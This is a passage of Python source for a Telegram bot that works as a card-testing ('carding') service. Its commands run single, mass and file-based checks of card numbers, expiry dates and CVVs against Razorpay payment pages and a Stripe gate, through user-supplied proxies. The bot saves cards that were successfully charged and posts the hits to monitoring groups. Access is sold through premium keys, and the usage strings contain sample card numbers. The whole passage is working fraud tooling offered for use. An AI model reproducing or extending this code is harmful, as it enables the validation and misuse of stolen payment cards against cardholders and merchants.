        _RZTEST_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("rztest"))
async def cmd_rztest(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /rztest site1.com\n"
            f"site2.com\n"
            f"site3.com\n\n"
            f"{pe(E['bolt'])} {bold('Max')} {bold(str(RZTEST_MAX))} {bold('sites per test.')}"
        )
        return

    sites: list[str] = []
    for line in raw_text.strip().splitlines():
        s = line.strip()
        if s and s not in sites:
            sites.append(s)
    if not sites:
        await message.reply(f"{pe(E['cross'])} {bold('No sites found!')}")
        return
    sites = sites[:RZTEST_MAX]

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(sites)

    init_lines = [f"{pe(E['rocket'])} {bold('RZ Site Tester')} [{bold('0')}/{bold(str(total))}]\n"]
    for s in sites:
        init_lines.append(f"{pe(E['loading'])} {bold(s)} {bold('testing...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(sites)

    tasks = [
        asyncio.create_task(
            _rztest_single(s, proxy_list, status_msg, results, order, user_name, user_uname, user_id)
        )
        for s in sites
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    working = [s for s in order if s in results and results[s]["working"]]
    if working:
        from io import BytesIO
        txt = "\n".join(working)
        try:
            await bot.send_document(
                message.chat.id,
                types.BufferedInputFile(txt.encode("utf-8"), filename="rz_working_sites.txt"),
                caption=(
                    f"{pe(E['check'])} {bold('Working RZ Sites')} ({bold(str(len(working)))})\n\n"
                    f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                ),
            )
        except Exception:
            pass
        try:
            _rz_site_lines = "\n".join(f"{pe(E['globe'])} {bold(s)}" for s in working)
            await bot.send_message(
                auth.APPROVED_GROUP_ID,
                f"{pe(E['check'])} {bold('RZ Working Sites')} ({bold(str(len(working)))})\n\n"
                f"{pe(R['checked_by'])} {bold('User:')} {user_link(user_id, user_name, user_uname)}\n\n"
                f"{_rz_site_lines}",
                disable_notification=True,
            )
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  /rz — Single Razorpay check
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("rz"))
async def cmd_rz(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])

    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /rz 4833120203826863|06|2030|288\n"
            f"{pe(E['next'])} {bold('Or reply to a message containing a CC.')}"
        )
        return

    site_url = get_user_rzsite(user_id)
    if not site_url:
        await message.reply(
            f"{pe(E['cross'])} {bold('No RZ site set!')}\n\n"
            f"{pe(E['next'])} {bold('Use /rzsite https://razorpay.me/@... or pages.razorpay.com/...')}"
        )
        return

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    bin_num = cc_str.split("|")[0][:6]

    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Gate:')} {bold('Razorpay')}\n"
        f"{pe(E['hourglass'])} {bold('Processing with Razorpay gateway...')}"
    )

    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            status, msg, code, dbg = await _rz_execute(cc_str, site_url, proxy_list)
        except Exception as e:
            status, msg, code, dbg = "unknown", str(e)[:80], "exception", {}
    bin_info = await _bin

    if code == "timeout":
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Check Timed Out!')}\n\n"
            f"{pe(E['warn'])} {bold('Proxy or Razorpay site took too long.')}\n"
            f"{pe(E['next'])} {bold('Try another proxy with')} /proxy"
        )
        return

    if _rz_is_proxy_error(code, msg):
        await safe_edit(loading_msg, 
            f"{pe(E['cross'])} {bold('Proxy Error!')}\n\n"
            f"{pe(E['warn'])} {bold('Error:')} {bold(msg)}\n\n"
            f"{pe(E['next'])} {bold('Your proxy IPs are blocked or rejected by Razorpay.')}\n"
            f"{pe(E['bolt'])} {bold('Fix: Use residential or mobile proxies.')}\n"
            f"{pe(E['next'])} {bold('Update proxies with')} /proxy"
        )
        return

    sl = _rz_status_line(status, msg, code)
    price = _rz_price(dbg)

    result_text = (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('Gate:')} {bold('Razorpay')}\n"
        f"{pe(R['price'])} {bold('Price:')} {bold(price)}\n"
        f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:100])}\n\n"
        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(message.from_user.id, message.from_user.full_name, message.from_user.username)}"
    )

    await safe_edit(loading_msg, result_text)

    if status == "live" and code in ("charged", "ok"):
        auth.save_charged_cc(cc_str, user_id, (message.from_user.full_name or "Unknown"), "Razorpay", price)
        try:
            await bot.pin_chat_message(message.chat.id, loading_msg.message_id, disable_notification=True)
        except Exception:
            pass
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass
    elif (status == "live" and code not in ("charged", "ok")) or (status == "dead" and "3ds" in code):
        await _send_approved(result_text)


# ══════════════════════════════════════════════════════════════════════════════
#  /mrz — Mass Razorpay check (max 10 inline, batch 10)
# ══════════════════════════════════════════════════════════════════════════════

MRZ_MAX_CCS = 10
_MRZ_EDIT_LOCKS: dict[int, asyncio.Lock] = {}


async def _mrz_check_single(
    cc_str: str, site_url: str, proxy_list: list,
    status_msg: types.Message, results: dict, order: list,
    user_name: str, user_uname: str, user_id: int,
):
    sem = get_user_semaphore(user_id)
    _bin = asyncio.create_task(bin_lookup(cc_str.split("|")[0][:6]))
    async with sem:
        try:
            status, msg, code, dbg = await _rz_execute(cc_str, site_url, proxy_list)
        except Exception as e:
            status, msg, code, dbg = "unknown", str(e)[:80], "exception", {}

    price = _rz_price(dbg)
    bin_info = await _bin
    results[cc_str] = {"status": status, "msg": msg, "code": code, "bin": bin_info, "price": price}

    if status == "live" and code in ("charged", "ok"):
        auth.save_charged_cc(cc_str, user_id, user_name, "Razorpay", price)

    msg_id = status_msg.message_id
    if msg_id not in _MRZ_EDIT_LOCKS:
        _MRZ_EDIT_LOCKS[msg_id] = asyncio.Lock()

    async with _MRZ_EDIT_LOCKS[msg_id]:
        done_count = sum(1 for cc in order if cc in results)
        total = len(order)

        lines = [f"{pe(E['bolt'])} {bold('RZ Mass Check')} [{bold(str(done_count))}/{bold(str(total))}]\n"]

        for cc in order:
            if cc in results:
                entry = results[cc]
                sl = _rz_status_line(entry["status"], entry["msg"], entry["code"])
                bi = entry["bin"]
                bin_line = f"{bi['brand']} | {bi['type']} | {bi['level']} | {bi['bank']} | {bi['flag']} {bi['country']}"
                lines.append(
                    f"{sl}\n"
                    f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                    f"{pe(R['gate'])} {bold('Gate:')} {bold('Razorpay')}\n"
                    f"{pe(R['price'])} {bold('Price:')} {bold(entry['price'])}\n"
                    f"{pe(R['gate'])} {bold('Response:')} {bold(entry['msg'][:80])}\n"
                    f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}"
                )
            else:
                lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")

        lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

        try:
            await safe_edit(status_msg, "\n\n".join(lines))
        except Exception:
            pass

    if sum(1 for cc in order if cc in results) == len(order):
        _MRZ_EDIT_LOCKS.pop(msg_id, None)


@router.message(Command("mrz"))
async def cmd_mrz(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('No CCs found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')}\n"
            f"/mrz cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv\n"
            f"cc|mm|yy|cvv"
        )
        return

    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(raw_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in raw_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found!')}")
        return

    all_ccs = all_ccs[:MRZ_MAX_CCS]

    site_url = get_user_rzsite(user_id)
    if not site_url:
        await message.reply(
            f"{pe(E['cross'])} {bold('No RZ site set!')}\n\n"
            f"{pe(E['next'])} {bold('Use /rzsite first.')}"
        )
        return

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""
    total = len(all_ccs)

    init_lines = [f"{pe(E['bolt'])} {bold('RZ Mass Check')} [{bold('0')}/{bold(str(total))}]\n"]
    for cc in all_ccs:
        init_lines.append(f"{pe(E['loading'])} <tg-spoiler>{cc}</tg-spoiler> {bold('checking...')}")
    init_lines.append(f"\n{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}")

    status_msg = await message.reply("\n\n".join(init_lines))

    results: dict = {}
    order = list(all_ccs)

    tasks = [
        asyncio.create_task(
            _mrz_check_single(cc, site_url, proxy_list, status_msg, results, order, user_name, user_uname, user_id)
        )
        for cc in all_ccs
    ]
    await asyncio.gather(*tasks, return_exceptions=True)

    _mrz_charged_sent = False
    for cc in order:
        if cc in results:
            e = results[cc]
            is_charged_mrz = e["status"] == "live" and e["code"] in ("charged", "ok")
            is_approved_mrz = (
                (e["status"] == "live" and e["code"] not in ("charged", "ok")) or
                (e["status"] == "dead" and "3ds" in e.get("code", ""))
            )
            if is_charged_mrz and not _mrz_charged_sent:
                _mrz_charged_sent = True
                try:
                    await bot.pin_chat_message(message.chat.id, status_msg.message_id, disable_notification=True)
                except Exception:
                    pass
                try:
                    charged_text = (
                        f"{pe(E['gem'])} {bold('Charged!')}\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(R['gate'])} {bold('Gate:')} {bold('Razorpay')}\n"
                        f"{pe(R['price'])} {bold('Price:')} {bold(e.get('price', '-'))}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    await bot.send_message(auth.MONITOR_GROUP_ID, charged_text)
                except Exception:
                    pass
            elif is_approved_mrz:
                try:
                    bi = e["bin"]
                    bin_line = f"{bi['brand']} | {bi['type']} | {bi['level']} | {bi['bank']} | {bi['flag']} {bi['country']}"
                    appr_text = (
                        f"{_rz_status_line(e['status'], e['msg'], e['code'])}\n\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(R['gate'])} {bold('Gate:')} {bold('Razorpay')}\n"
                        f"{pe(R['price'])} {bold('Price:')} {bold(e.get('price', '-'))}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(e['msg'][:80])}\n"
                        f"{pe(R['bin_info'])} {bold('BIN:')} {bold(bin_line)}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )
                    await _send_approved(appr_text)
                except Exception:
                    pass


# ══════════════════════════════════════════════════════════════════════════════
#  /rztxt — Razorpay file check (reply to .txt) — same logic as /ran
# ══════════════════════════════════════════════════════════════════════════════

_RZTXT_ACTIVE_USERS: set[int] = set()
_RZTXT_STOP_FLAGS: dict[str, bool] = {}
RZTXT_BATCH_SIZE = 70


async def _rztxt_wrap_task(cc_str, site_url, proxy_list, user_id=0):
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            status, msg, code, dbg = await _rz_execute(cc_str, site_url, proxy_list)
        except Exception as e:
            status, msg, code, dbg = "unknown", str(e)[:80], "exception", {}
    price = _rz_price(dbg)
    return status, msg, code, cc_str, price


async def _process_rztxt_cards(
    all_ccs: list, user_id: int, user_name: str, user_uname: str,
    chat_id: int, status_msg: types.Message, stop_key: str,
    site_url: str, proxy_list: list,
):
    total = len(all_ccs)
    checked, approved, charged_count, declined, skipped = 0, 0, 0, 0, 0
    _start_time = time.time()
    _last_status_edit = 0.0

    try:
        for i in range(0, len(all_ccs), RZTXT_BATCH_SIZE):
            if _RZTXT_STOP_FLAGS.get(stop_key):
                skipped += len(all_ccs) - i - checked
                break

            batch = all_ccs[i:i + RZTXT_BATCH_SIZE]
            wrapped = []
            for cc in batch:
                if _RZTXT_STOP_FLAGS.get(stop_key):
                    break
                wrapped.append(_rztxt_wrap_task(cc, site_url, proxy_list, user_id))

            if not wrapped:
                continue

            for fut in asyncio.as_completed(wrapped):
                status, msg, code, cc, price = await fut

                if _RZTXT_STOP_FLAGS.get(stop_key):
                    skipped += 1
                    continue

                if _rz_is_proxy_error(code, msg):
                    _RZTXT_STOP_FLAGS[stop_key] = True
                    skipped += total - checked
                    try:
                        await bot.send_message(
                            chat_id,
                            f"{pe(E['cross'])} {bold('Proxy Error — Batch Stopped!')}\n\n"
                            f"{pe(E['warn'])} {bold('Error:')} {bold(msg)}\n\n"
                            f"{pe(E['next'])} {bold('Your proxy IPs are blocked or rejected by Razorpay.')}\n"
                            f"{pe(E['bolt'])} {bold('Fix: Use residential or mobile proxies.')}\n"
                            f"{pe(E['next'])} {bold('Update proxies with')} /proxy"
                        )
                    except Exception:
                        pass
                    break

                checked += 1
                ml = msg.lower()

                is_charged = status == "live" and code in ("charged", "ok")
                is_insuf = status == "live" and (code == "live_limit" or "insufficient" in ml)
                is_ccn = status == "live" and (code == "ccn" or "cvv" in ml or "cvc" in ml)
                is_declined = status == "dead" and "3ds" not in code

                should_send = False
                if is_charged:
                    charged_count += 1
                    approved += 1
                    should_send = True
                elif is_insuf:
                    approved += 1
                    should_send = True
                elif is_ccn:
                    approved += 1
                    should_send = True
                elif is_declined:
                    declined += 1
                else:
                    declined += 1

                if should_send:
                    bin_num = cc.split("|")[0][:6]
                    bin_info = await bin_lookup(bin_num)
                    sl = _rz_status_line(status, msg, code)

                    hit_text = (
                        f"{sl}\n\n"
                        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc}</tg-spoiler>\n"
                        f"{pe(R['gate'])} {bold('Gate:')} {bold('Razorpay')}\n"
                        f"{pe(R['price'])} {bold('Price:')} {bold(price)}\n"
                        f"{pe(R['gate'])} {bold('Response:')} {bold(msg[:100])}\n\n"
                        f"{pe(R['bin_info'])} {bold('BIN Info:')}\n"
                        f"{brand_emoji(bin_info['brand'])}{bold('Brand:')} {bold(bin_info['brand'])}\n"
                        f"{pe(R['type'])} {bold('Type:')} {bold(bin_info['type'])}\n"
                        f"{pe(R['level'])} {bold('Level:')} {bold(bin_info['level'])}\n"
                        f"{pe(R['bank'])} {bold('Bank:')} {bold(bin_info['bank'])}\n"
                        f"{pe(R['country'])} {bold('Country:')} {bin_info['flag']} {bold(bin_info['country'])}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )

                    try:
                        sent_msg = await bot.send_message(chat_id, hit_text)
                        if is_charged:
                            auth.save_charged_cc(cc, user_id, user_name, "Razorpay", price)
                            try:
                                await bot.pin_chat_message(chat_id, sent_msg.message_id, disable_notification=True)
                            except Exception:
                                pass
                            try:
                                await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
                            except Exception:
                                pass
                        else:
                            await _send_approved(hit_text)
                    except Exception:
                        pass

                _now = time.time()
                if _now - _last_status_edit >= 3 or (checked + skipped) >= total:
                    _last_status_edit = _now

                    stop_btn = {
                        "inline_keyboard": [[{
                            "text": f"{bold('Stop Checking')}",
                            "callback_data": f"rztxt_stop:{stop_key}",
                            "icon_custom_emoji_id": E["stop"],
                            "style": "danger",
                        }]]
                    }

                    progress_text = (
                        f"{pe(E['rocket'])} {bold('RZ File Check')}\n\n"
                        f"{pe(E['bolt'])} {bold('Response:')} {bold(msg[:60])}\n"
                        f"{pe(R['cc'])} <tg-spoiler>{cc}</tg-spoiler>\n\n"
                        f"{pe(E['bolt'])} {bold('Progress:')} {bold(str(checked + skipped))}/{bold(str(total))}\n"
                        f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged_count))}\n"
                        f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
                        f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
                        f"{pe(E['hourglass'])} {bold('Remaining:')} {bold(str(total - checked - skipped))}\n\n"
                        f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
                    )

                    try:
                        if (checked + skipped) >= total:
                            await safe_edit(status_msg, progress_text)
                        else:
                            await safe_edit(status_msg, progress_text, reply_markup=stop_btn)
                    except Exception:
                        pass

    finally:
        _RZTXT_STOP_FLAGS.pop(stop_key, None)

    _elapsed = int(time.time() - _start_time)
    _elapsed_str = f"{_elapsed // 60}m {_elapsed % 60}s" if _elapsed >= 60 else f"{_elapsed}s"
    try:
        await safe_edit(status_msg, 
            f"{pe(E['check'])} {bold('RZ File Check Complete!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['gem'])} {bold('Charged:')} {bold(str(charged_count))}\n"
            f"{pe(E['check'])} {bold('Approved:')} {bold(str(approved))}\n"
            f"{pe(E['cross'])} {bold('Declined:')} {bold(str(declined))}\n"
            f"{pe(E['warn'])} {bold('Skipped:')} {bold(str(skipped))}\n"
            f"{pe(E['hourglass'])} {bold('Time:')} {bold(_elapsed_str)}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}"
        )
    except Exception:
        pass


@router.message(Command("rztxt"))
async def cmd_rztxt(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} {bold('Send a .txt file with CCs')}\n"
            f"{pe(E['next'])} {bold('Reply to the file with')} /rztxt\n\n"
            f"{pe(E['bolt'])} {bold('Format:')} cc|mm|yy|cvv {bold('(one per line)')}"
        )
        return

    doc = message.reply_to_message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply(f"{pe(E['cross'])} {bold('Only .txt files are supported!')}")
        return

    site_url = get_user_rzsite(user_id)
    if not site_url:
        await message.reply(
            f"{pe(E['cross'])} {bold('No RZ site set!')}\n\n"
            f"{pe(E['next'])} {bold('Use /rzsite first.')}"
        )
        return

    proxy_list = get_user_proxies(user_id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Add proxies first with')} /proxy"
        )
        return

    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await message.reply(f"{pe(E['cross'])} {bold('Failed to download file!')}")
        return

    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)
    if not all_ccs:
        for line in file_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(f"{pe(E['cross'])} {bold('No valid CCs found in the file!')}")
        return

    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]
        await message.reply(
            f"{pe(E['warn'])} {bold('CC limit reached!')} {bold(str(cc_limit))} {bold('CCs max.')}\n"
            f"{pe(E['next'])} {bold('Extra CCs skipped.')}"
        )

    if user_id in _RZTXT_ACTIVE_USERS:
        await message.reply(
            f"{pe(E['warn'])} {bold('Your RZ file check is already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap Stop first.')}"
        )
        return

    stop_key = f"rztxt:{message.chat.id}:{user_id}"
    _RZTXT_STOP_FLAGS[stop_key] = False
    _RZTXT_ACTIVE_USERS.add(user_id)

    total = len(all_ccs)
    user_name = message.from_user.full_name or ""
    user_uname = message.from_user.username or ""

    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"rztxt_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }

        status_msg = await message.reply(
            f"{pe(E['rocket'])} {bold('RZ File Check Started!')}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['hourglass'])} {bold('Batch Size:')} {bold(str(RZTXT_BATCH_SIZE))}\n"
            f"{pe(E['refresh'])} {bold('Random proxy per CC + retries')}\n"
            f"{pe(E['globe'])} {bold('Gate:')} {bold('Razorpay')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )

        await _process_rztxt_cards(
            all_ccs, user_id, user_name, user_uname,
            message.chat.id, status_msg, stop_key, site_url, proxy_list,
        )
    finally:
        _RZTXT_ACTIVE_USERS.discard(user_id)


@router.callback_query(F.data.startswith("rztxt_stop:"))
async def cb_rztxt_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    clicker_id = callback.from_user.id
    try:
        owner_id = int(stop_key.split(":")[-1])
    except (ValueError, IndexError):
        owner_id = 0

    if clicker_id != owner_id and not auth.is_admin(clicker_id):
        await callback.answer(bold("Only the owner can stop this!"), show_alert=True)
        return

    _RZTXT_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping..."), show_alert=False)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass



# ══════════════════════════════════════════════════════════════════════════════
#  STRIPE AUTH GATE  /chk  /mchk  /chktxt  (no proxy — oliveadot / dice-heads)
# ══════════════════════════════════════════════════════════════════════════════

MCHK_MAX_CCS = 10
CHKTXT_BATCH = 5

_MCHK_EDIT_LOCKS: dict[int, asyncio.Lock] = {}
_CHKTXT_STOP_FLAGS: dict[str, bool] = {}
_CHKTXT_ACTIVE_USERS: set[int] = set()


def _chk_status_line(status: str, msg: str, code: str) -> str:
    if code == "cvv_approved" or status == "approved":
        return f"{pe(E['gem'])} {bold('CVV Approved — Card Added!')}"
    if code == "ccn" or status == "ccn":
        return f"{pe(E['check2'])} {bold('CCN — Incorrect CVC')}"
    if code in ("connection_error", "site_error") or status == "error":
        return f"{pe(E['warn'])} {bold('Connection / Site Error')}"
    if status == "declined":
        return f"{pe(E['cross'])} {bold('Declined')}"
    return f"{pe(E['warn2'])} {bold(msg[:60])}"


def _chk_run_check(cc_str: str, max_retries: int = 4) -> tuple[str, str, str, str]:
    """Sync wrapper — runs chk.check_card_str (random site rotation, no proxy)."""
    try:
        return chk.check_card_str(cc_str, max_retries=max_retries)
    except Exception as e:
        return "error", str(e)[:80], "exception", ""


@router.message(Command("chk"))
async def cmd_chk(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Access Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key: @Mod_By_Kamal')}"
            f"\n{pe(E['next'])} /redeem {bold('Kamal-xxxxx')}"
        )
        return

    cc_str = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /chk 4388540109154632|03|2030|815\n"
            f"{pe(E['next'])} {bold('Or reply to a message containing a CC.')}"
        )
        return

    bin_num = cc_str.split("|")[0][:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Checking CC...')}\n\n"
        f"{pe(E['bolt'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(E['globe'])} {bold('Gate:')} {bold('Stripe Auth')}\n"
        f"{pe(E['hourglass'])} {bold('Processing...')}"
    )

    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem = get_user_semaphore(user_id)
    async with sem:
        try:
            status, msg, code, site_url = await asyncio.get_running_loop().run_in_executor(
                CHECKER_POOL, lambda: _chk_run_check(cc_str),
            )
        except Exception as e:
            status, msg, code, site_url = "error", str(e)[:80], "exception", ""
    bin_info = await _bin

    sl = _chk_status_line(status, msg, code)
    result_text = (
        f"{sl}\n\n"
        f"{pe(R['cc'])} {bold('CC:')} <tg-spoiler>{cc_str}</tg-spoiler>\n"
